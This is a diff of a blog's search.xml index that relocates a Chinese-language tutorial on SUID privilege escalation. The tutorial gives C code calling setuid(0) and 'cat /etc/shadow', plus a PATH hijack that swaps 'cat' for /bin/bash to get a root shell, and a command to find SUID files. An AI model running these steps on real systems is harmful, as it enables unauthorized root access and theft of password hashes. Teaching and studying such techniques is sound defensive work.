@@ -1,6 +1,29 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>SUID提权</title>
+    <url>/archives/5c206d0f.html</url>
+    <content><![CDATA[<div align='center' ><font color=#FF000 size='70'>SUID提权</font></div>
+&nbsp;
+
+
+<p><font color=#FF000 size=4 ><strong>本文档只做讲解，请勿用做非法用途，否则后果自负，谢谢！！！</strong></font><br>&nbsp;</p>
+<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>   1.几乎所有的Linux系统都可以执行<br>   2.无需工具，只需本地编辑文件即可</p>
+<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>   1.只是临时提权<br>   2.需要root编辑文件并设置SUID权限</p>
+<h2 id="提权准备"><a href="#提权准备" class="headerlink" title="提权准备"></a>提权准备</h2><h3 id="1-使用root编辑suid-c文件"><a href="#1-使用root编辑suid-c文件" class="headerlink" title="1.使用root编辑suid.c文件"></a>1.使用root编辑suid.c文件</h3><p>#include&lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>int main()<br>{<br>setuid(0);//run as root<br>system(“id”);<br>system(“cat /etc/shadow”);<br>}<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/1.jpg" alt="suid.c文件内容"></p>
+<h3 id="2-root编译并设置SUID权限"><a href="#2-root编译并设置SUID权限" class="headerlink" title="2.root编译并设置SUID权限"></a>2.root编译并设置SUID权限</h3><p>gcc suid.c -o suid-exp<br>chmod 4775 suid-exp<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/2.jpg" alt="设置SUID权限"><br>S代表suid属性<br>find / -perm -u=s -type f 2&gt;/dev/null<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/3.jpg" alt="查找SUID文件"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="1-切换普通用户"><a href="#1-切换普通用户" class="headerlink" title="1.切换普通用户"></a>1.切换普通用户</h3><p><img src="/archives/SUID%E6%8F%90%E6%9D%83/4.jpg" alt="切换普通用户"></p>
+<h3 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h3><p>echo “/bin/bash” &gt; cat &amp;&amp; chmod 777 cat<br>export PATH=.:$PATH<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/5.jpg" alt="设置环境变量"><br>./suid-exp<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/6.jpg" alt="提权"><br>可以发现此时已经是root用户</p>
+<h2 id="提权测试"><a href="#提权测试" class="headerlink" title="提权测试"></a>提权测试</h2><p><img src="/archives/SUID%E6%8F%90%E6%9D%83/7.jpg" alt="提权测试"><br>可以发现此时可以创建用户了</p>
+]]></content>
+      <categories>
+        <category>提权</category>
+      </categories>
+      <tags>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>信息收集之域名收集</title>
     <url>/archives/56dc95ea.html</url>
     <content><![CDATA[<div align='center' ><font color=#FF000 size='70'>信息收集之域名收集</font></div>
@@ -24,29 +47,6 @@
       <tags>
         <tag>信息收集</tag>
         <tag>域名</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SUID提权</title>
-    <url>/archives/5c206d0f.html</url>
-    <content><![CDATA[<div align='center' ><font color=#FF000 size='70'>SUID提权</font></div>
-&nbsp;
-
-
-<p><font color=#FF000 size=4 ><strong>本文档只做讲解，请勿用做非法用途，否则后果自负，谢谢！！！</strong></font><br>&nbsp;</p>
-<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>   1.几乎所有的Linux系统都可以执行<br>   2.无需工具，只需本地编辑文件即可</p>
-<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>   1.只是临时提权<br>   2.需要root编辑文件并设置SUID权限</p>
-<h2 id="提权准备"><a href="#提权准备" class="headerlink" title="提权准备"></a>提权准备</h2><h3 id="1-使用root编辑suid-c文件"><a href="#1-使用root编辑suid-c文件" class="headerlink" title="1.使用root编辑suid.c文件"></a>1.使用root编辑suid.c文件</h3><p>#include&lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>int main()<br>{<br>setuid(0);//run as root<br>system(“id”);<br>system(“cat /etc/shadow”);<br>}<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/1.jpg" alt="suid.c文件内容"></p>
-<h3 id="2-root编译并设置SUID权限"><a href="#2-root编译并设置SUID权限" class="headerlink" title="2.root编译并设置SUID权限"></a>2.root编译并设置SUID权限</h3><p>gcc suid.c -o suid-exp<br>chmod 4775 suid-exp<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/2.jpg" alt="设置SUID权限"><br>S代表suid属性<br>find / -perm -u=s -type f 2&gt;/dev/null<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/3.jpg" alt="查找SUID文件"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="1-切换普通用户"><a href="#1-切换普通用户" class="headerlink" title="1.切换普通用户"></a>1.切换普通用户</h3><p><img src="/archives/SUID%E6%8F%90%E6%9D%83/4.jpg" alt="切换普通用户"></p>
-<h3 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h3><p>echo “/bin/bash” &gt; cat &amp;&amp; chmod 777 cat<br>export PATH=.:$PATH<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/5.jpg" alt="设置环境变量"><br>./suid-exp<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/6.jpg" alt="提权"><br>可以发现此时已经是root用户</p>
-<h2 id="提权测试"><a href="#提权测试" class="headerlink" title="提权测试"></a>提权测试</h2><p><img src="/archives/SUID%E6%8F%90%E6%9D%83/7.jpg" alt="提权测试"><br>可以发现此时可以创建用户了</p>
-]]></content>
-      <categories>
-        <category>提权</category>
-      </categories>
-      <tags>
-        <tag>提权</tag>
       </tags>
   </entry>
 </search>
